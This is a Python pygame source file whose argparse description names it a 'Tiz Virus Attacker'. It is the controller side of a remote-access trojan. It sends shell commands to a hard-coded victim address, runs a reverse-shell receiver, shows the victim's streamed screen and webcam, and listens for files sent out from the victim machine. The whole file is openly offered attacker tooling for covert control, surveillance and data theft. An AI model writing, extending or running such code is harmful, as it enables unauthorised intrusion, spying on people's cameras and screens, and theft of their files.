# -*- coding: utf-8 -*-
"""
Created on Dec 23 2020

@autor Tiz
"""
from __future__ import division
import pygame
import numpy as np
import socket, argparse, sys, threading, os, zlib, cv2, struct

# Initialize Pygame
pygame.init()

# Set up display
WIDTH, HEIGHT = 800, 600
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("Remote Desktop Menu")

# Colors
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
GRAY = (200, 200, 200)
DARK_GRAY = (100, 100, 100)
RED = (255, 0, 0)
GREEN = (0, 255, 0)
BLUE = (0, 0, 255)

# Font
font = pygame.font.Font(None, 36)

# arguments parser
def parseargs():
    cli_args = argparse.ArgumentParser(description="Tiz Virus Attacker")
    cli_args.add_argument('--host', help="connecting ip, default is localhost'", default='192.168.1.93', type=str)
    cli_args.add_argument('--port', help="default port is 5000, revershell = port, camera stream = port+1, screen stream = port+2, file transfer = port+3", default=5000, type=int)
    cli_args.add_argument('--shell', help="shell=t revershell on port (default = 5000) / shell=f don't revershell", default="t", type=str)
    cli_args.add_argument('--camera', help="camera=t stream camera on port+1 (default = 5001) / camera=f don't stream",default="t", type=str)
    cli_args.add_argument('--screen', help="screen=t stream screen on port+2 (default = 5002) / screen=f don't stream",default="t", type=str)
    options = cli_args.parse_args(sys.argv[1:])
    return options

class Display:
    def __init__(self, x, y, width, height, text):
        self.rect = pygame.Rect(x, y, width, height)
        self.text = text

    def draw(self, surface, offset_y):
        adjusted_rect = self.rect.copy()
        adjusted_rect.y -= offset_y
        if 0 <= adjusted_rect.y < HEIGHT and adjusted_rect.bottom > 0:
            pygame.draw.rect(surface, GRAY, adjusted_rect)
            pygame.draw.rect(surface, DARK_GRAY, adjusted_rect, 2)
            text_surface = font.render(self.text, True, BLACK)
            text_rect = text_surface.get_rect(center=adjusted_rect.center)
            surface.blit(text_surface, text_rect)

class Button:
    def __init__(self, x, y, width, height, text, color):
        self.rect = pygame.Rect(x, y, width, height)
        self.text = text
        self.color = color

    def draw(self, surface):
        pygame.draw.rect(surface, self.color, self.rect)
        pygame.draw.rect(surface, DARK_GRAY, self.rect, 2)
        text_surface = font.render(self.text, True, BLACK)
        text_rect = text_surface.get_rect(center=self.rect.center)
        surface.blit(text_surface, text_rect)

class InputBox:
    def __init__(self, x, y, width, height):
        self.rect = pygame.Rect(x, y, width, height)
        self.color = BLACK
        self.text = ''
        self.prompt = 'Enter command: '
        self.active = False
        self.font = pygame.font.Font(None, 25)
        self.history = []  # Lưu lịch sử lệnh và kết quả
        self.scroll_offset = 0  # Vị trí cuộn hiện tại
        self.cursor_visible = True  # Con trỏ chuột
        self.cursor_counter = 0   # Để điều khiển nhấp nháy con trỏ

    def handle_event(self, event):
        if event.type == pygame.MOUSEBUTTONDOWN:
            if self.rect.collidepoint(event.pos):
                self.active = not self.active
            else:
                self.active = False
            self.color = GREEN if self.active else GRAY

        if event.type == pygame.KEYDOWN and self.active:
            if event.key == pygame.K_RETURN:
                # Xử lý lệnh
                command = self.text.strip()  # Xóa khoảng trắng không cần thiết
                result = self.send_command(command)
                self.history.append(f"$ {command}")  # Thêm lệnh
                self.history.append(result)  # Thêm kết quả
                self.text = '' 
                self.scroll_offset = max(0, len(self.history) * 20 - self.rect.height)  # Cuộn xuống cuối
            elif event.key == pygame.K_BACKSPACE:
                self.text = self.text[:-1]
            else:
                self.text += event.unicode

        # Điều khiển cuộn (scroll) khi con lăn chuột được sử dụng
        if event.type == pygame.MOUSEBUTTONDOWN:
            if event.button == 4:  # Cuộn lên
                self.scroll_offset = max(0, self.scroll_offset - 20)
            elif event.button == 5:  # Cuộn xuống
                self.scroll_offset = min(len(self.history) * 20, self.scroll_offset + 20)

    def send_command(self, command):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            BUFFER_SIZE = 1024
            s.connect(('192.168.1.93', 5000))
            
            # Gửi lệnh
            s.send(command.encode())
            if command.lower() == "exit":
                return "Disconected."

            # Nhận kết quả từ server
            results = s.recv(BUFFER_SIZE).decode()
            s.close()
            return results  # Trả về kết quả để hiển thị trong vùng nhập lệnh
        
        except Exception as e:
            return f"Error when sending command: {e}"


    def draw(self, surface):
        # Xóa và tô lại nền đen
        pygame.draw.rect(surface, BLACK, self.rect)

        # Vẽ lịch sử lệnh với khả năng cuộn
        y_offset = self.rect.y - self.scroll_offset
        for line in self.history:
            txt_surface = self.font.render(line, True, WHITE)
            surface.blit(txt_surface, (self.rect.x + 5, y_offset))
            y_offset += txt_surface.get_height()

        # Hiển thị vùng nhập lệnh hiện tại
        txt_surface = self.font.render(self.text, True, WHITE)
        surface.blit(txt_surface, (self.rect.x + 5, y_offset))

        # Hiển thị con trỏ nhấp nháy
        if self.active and self.cursor_visible:
            cursor_x = txt_surface.get_width() + 10
            pygame.draw.rect(surface, WHITE, (self.rect.x + cursor_x, y_offset, 2, txt_surface.get_height()))

        # Cập nhật trạng thái nhấp nháy con trỏ
        self.cursor_counter += 1
        if self.cursor_counter % 60 < 30:
            self.cursor_visible = True
        else:
            self.cursor_visible = False


# Create initial displays
displays = [
    Display(50, 50, 200, 150, "Display 1"),
    Display(300, 50, 200, 150, "Display 2"),
    Display(550, 50, 200, 150, "Display 3"),
]

# Create "+" button
add_button = Display(WIDTH - 100, HEIGHT - 100, 80, 80, "+")
back_button = Display(10, 10, 100, 50, "Back")

# Camera, Screen, and File thread status
camera_running = False
screen_running = False

# Define the video panel rectangle for screen stream
screen_panel_rect = pygame.Rect(50, 50, 500, 500)  # X, Y, Width, Height

def create_new_display():
    num_displays = len(displays)
    row = num_displays // 3
    col = num_displays % 3
    x = 50 + col * 250
    y = 50 + row * 200
    return Display(x, y, 200, 150, f"Display {num_displays + 1}")

# reverse shell receiver
def R_tcp(host='192.168.1.93', port=5000):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    BUFFER_SIZE = 1024
    s.connect((host, port))
    message = s.recv(BUFFER_SIZE).decode()
    while True:
        command = input("Enter the command you wanna execute:")
        s.send(command.encode())
        if command.lower() == "exit":
            break
        results = s.recv(BUFFER_SIZE).decode()
        print(results)
    s.close()

def recvall(sock, length, buffer_size=8192):
    buf = b''
    while len(buf) < length:
        data = sock.recv(min(buffer_size, length - len(buf)))
        if not data:
            return None
        buf += data
    return buf


def screenreceiver(host='192.168.1.93', port=5001):
    global screen_running
    screen_running = True
    with socket.socket() as sock:
        sock.connect((host, port))
        while screen_running:
            try:
                size_len = sock.recv(1)
                if not size_len:
                    print("Disconnected from server.")
                    break
                
                size_len = int.from_bytes(size_len, byteorder='big')
                size = int.from_bytes(sock.recv(size_len), byteorder='big')

                print(f"Receiving frame size: {size} bytes")

                pixels = recvall(sock, size)
                if not pixels:
                    print("Received incomplete frame data.")
                    break

                try:
                    pixels = zlib.decompress(pixels)
                except zlib.error as e:
                    print(f"Error decompressing: {e}")
                    continue

                print(f"Decompressed frame size: {len(pixels)} bytes")

                img = pygame.image.fromstring(pixels, (500, 500), 'RGB')
                screen.blit(img, screen_panel_rect.topleft)
                pygame.display.flip() 
                pygame.display.update([screen_panel_rect])
                pygame.time.delay(30)

            except Exception as e:
                print(f"Error receiving/displaying image: {e}")
                break

def camreceiver(host='192.168.1.93', port=5002):
    global camera_running
    s = socket.socket()
    s.connect((host, port))
    camera_running = True
    dat = b''
    while camera_running:
        seg = s.recv(500)
        dat += seg
        try:
            img = cv2.imdecode(np.frombuffer(dat, dtype=np.uint8), cv2.IMREAD_COLOR)
            if img is not None:
                cv2.imshow('Camera', img)
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    camera_running = False
                    break
        except Exception as e:
            print(f"Error: {e}")
        dat = b''
    camera_running = False
    s.close()
    cv2.destroyAllWindows()

def receive_file(host, port, save_directory='received_files'):
    if not os.path.exists(save_directory):
        os.makedirs(save_directory)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen()
        print(f"Listening for files on {host}:{port}")
        conn, addr = s.accept()
        with conn:
            print(f"Connected by {addr}")
            while True:
                try:
                    file_info = conn.recv(1024).strip().decode('utf-8')
                    if not file_info:
                        print("No more file info received.")
                        break

                    filename, filesize = file_info.split('|')
                    filesize = int(filesize)
                    print(f"Receiving {filename} with size {filesize} bytes")

                    filepath = os.path.join(save_directory, filename)
                    with open(filepath, 'wb') as f:
                        remaining = filesize
                        while remaining > 0:
                            chunk_size = 4096 if remaining >= 4096 else remaining
                            chunk = conn.recv(chunk_size)
                            if not chunk:
                                break
                            f.write(chunk)
                            remaining -= len(chunk)
                        print(f"Received {filename} successfully! Saved to {filepath}")
                except Exception as e:
                    print(f"Error receiving file: {e}")
                    break


def show_full_screen(display):
    pygame.init()
    font = pygame.font.SysFont(None, 36)
    full_screen = True
    camera_button = Button(WIDTH // 4 - 100, HEIGHT // 2 + 100, 190, 50, "Start Camera", GREEN)
    screen_button = Button(3 * WIDTH // 4 - 100, HEIGHT // 2 + 100, 190, 50, "Start Screen", BLUE)
    file_button = Button(WIDTH // 2 - 100, HEIGHT // 2 + 100, 190, 50, "Receive File", RED)
    
    # Cập nhật kích thước InputBox để rộng hơn
    input_box = InputBox(WIDTH // 4 - 100, HEIGHT // 2 + 160, 590, 130)
    camera_thread = None
    screen_thread = None

    global camera_running, screen_running

    while full_screen:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            input_box.handle_event(event)  # Xử lý sự kiện cho vùng input

            if event.type == pygame.MOUSEBUTTONDOWN:
                if event.button == 1:
                    if back_button.rect.collidepoint(event.pos):
                        full_screen = False
                    elif camera_button.rect.collidepoint(event.pos):
                        if not camera_running:
                            camera_thread = threading.Thread(target=camreceiver)
                            camera_thread.start()
                            camera_button.text = "Stop Camera"
                        else:
                            camera_running = False
                            camera_button.text = "Start Camera"
                    elif screen_button.rect.collidepoint(event.pos):
                        if not screen_running:
                            screen_thread = threading.Thread(target=screenreceiver)
                            screen_thread.start()
                            screen_button.text = "Stop Screen"
                        else:
                            screen_running = False
                            screen_button.text = "Start Screen"
                    elif file_button.rect.collidepoint(event.pos):               
                        file_thread = threading.Thread(target=receive_file, args=("0.0.0.0", options.port + 3))  # Port 5003
                        file_thread.start()

        screen.fill(WHITE)
        text_surface = font.render(f"Full Screen: {display.text}", True, BLACK)
        text_rect = text_surface.get_rect(center=(WIDTH // 2, HEIGHT // 4))
        screen.blit(text_surface, text_rect)
        
        camera_button.draw(screen)
        screen_button.draw(screen)
        file_button.draw(screen)
        back_button.draw(screen, 0)
        
        input_box.draw(screen)

        pygame.display.flip()

    if screen_thread:
        screen_running = False
        screen_thread.join()


def main():
    global options
    options = parseargs()
    clock = pygame.time.Clock()
    scroll_y = 0
    max_scroll_y = 0

    while True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            if event.type == pygame.MOUSEBUTTONDOWN:
                if event.button == 1:
                    for display in displays:
                        if display.rect.collidepoint(event.pos[0], event.pos[1] + scroll_y):
                            show_full_screen(display)
                    if add_button.rect.collidepoint(event.pos):
                        new_display = create_new_display()
                        displays.append(new_display)
                        max_scroll_y = max(0, (len(displays) // 3) * 200 + 50 - HEIGHT)
                elif event.button == 4:  
                    scroll_y = max(0, scroll_y - 20)
                elif event.button == 5:  
                    scroll_y = min(max_scroll_y, scroll_y + 20)

        screen.fill(WHITE)

        for display in displays:
            display.draw(screen, scroll_y)

        add_button.draw(screen, 0)

        pygame.display.flip()
        clock.tick(60)

if __name__ == "__main__":
    main()
